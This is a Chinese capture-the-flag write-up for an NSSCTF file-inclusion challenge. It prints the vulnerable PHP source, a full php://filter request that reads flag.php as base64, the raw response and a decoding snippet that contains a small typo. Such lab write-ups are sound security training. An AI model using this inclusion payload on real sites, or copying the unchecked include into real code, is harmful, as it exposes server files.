# include

题目链接：https://www.nssctf.cn/problem/427



解题思路：

输入：http://node7.anna.nssctf.cn:29042/?file=1 可以看到源码：

```
<?php
ini_set("allow_url_include","on");
header("Content-type: text/html; charset=utf-8");
error_reporting(0);
$file=$_GET['file'];
if(isset($file)){
    show_source(__FILE__);
    echo 'flag 在flag.php中';
}else{
    echo "传入一个file试试";
}
echo "</br>";
echo "</br>";
echo "</br>";
echo "</br>";
echo "</br>";
include_once($file);
?> flag 在flag.php中
```

同时题目已经提示了文件包含+伪协议。因此使用php://filter进行flag文件内容的读取。

发送请求：

```
GET /?file=php://filter/read=convert.base64-encode/resource=flag.php HTTP/1.1
Host: node7.anna.nssctf.cn:29042
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_648a44a949074de73151ffaa0a832aec=1746795377; HMACCOUNT=95981CB1F69319FB; Hm_lpvt_648a44a949074de73151ffaa0a832aec=1746796129
Connection: keep-alive
Content-Length: 0


```

得到响应：

```
HTTP/1.1 200 OK
Date: Fri, 09 May 2025 13:58:38 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/5.6.40
Vary: Accept-Encoding
Content-Length: 2318
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=utf-8

<code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php
<br />ini_set</span><span style="color: #007700">(</span><span style="color: #DD0000">"allow_url_include"</span><span style="color: #007700">,</span><span style="color: #DD0000">"on"</span><span style="color: #007700">);
<br /></span><span style="color: #0000BB">header</span><span style="color: #007700">(</span><span style="color: #DD0000">"Content-type:&nbsp;text/html;&nbsp;charset=utf-8"</span><span style="color: #007700">);
<br /></span><span style="color: #0000BB">error_reporting</span><span style="color: #007700">(</span><span style="color: #0000BB">0</span><span style="color: #007700">);
<br /></span><span style="color: #0000BB">$file</span><span style="color: #007700">=</span><span style="color: #0000BB">$_GET</span><span style="color: #007700">[</span><span style="color: #DD0000">'file'</span><span style="color: #007700">];
<br />if(isset(</span><span style="color: #0000BB">$file</span><span style="color: #007700">)){
<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">show_source</span><span style="color: #007700">(</span><span style="color: #0000BB">__FILE__</span><span style="color: #007700">);
<br />&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">'flag&nbsp;在flag.php中'</span><span style="color: #007700">;
<br />}else{
<br />&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">"传入一个file试试"</span><span style="color: #007700">;
<br />}
<br />echo&nbsp;</span><span style="color: #DD0000">"&lt;/br&gt;"</span><span style="color: #007700">;
<br />echo&nbsp;</span><span style="color: #DD0000">"&lt;/br&gt;"</span><span style="color: #007700">;
<br />echo&nbsp;</span><span style="color: #DD0000">"&lt;/br&gt;"</span><span style="color: #007700">;
<br />echo&nbsp;</span><span style="color: #DD0000">"&lt;/br&gt;"</span><span style="color: #007700">;
<br />echo&nbsp;</span><span style="color: #DD0000">"&lt;/br&gt;"</span><span style="color: #007700">;
<br />include_once(</span><span style="color: #0000BB">$file</span><span style="color: #007700">);
<br /></span><span style="color: #0000BB">?&gt;</span>
</span>
</code>flag 在flag.php中</br></br></br></br></br>PD9waHANCiRmbGFnPSdOU1NDVEZ7ZTU0ZWFlZTMtOTE3Yy00ZTBhLWFkNjktNjNkM2FkZDZhNjg0fSc7
```

使用python进行解码，得到flag：

```
import base64
base64.b64decode("PD9waHANCiRmbGFnPSdOU1NDVEZ7ZTU0ZWFlZTMtOTE3Yy00ZTBhLWFkNjktNjNkM2FkZDZhNjg0fSc7".encod\e())
```

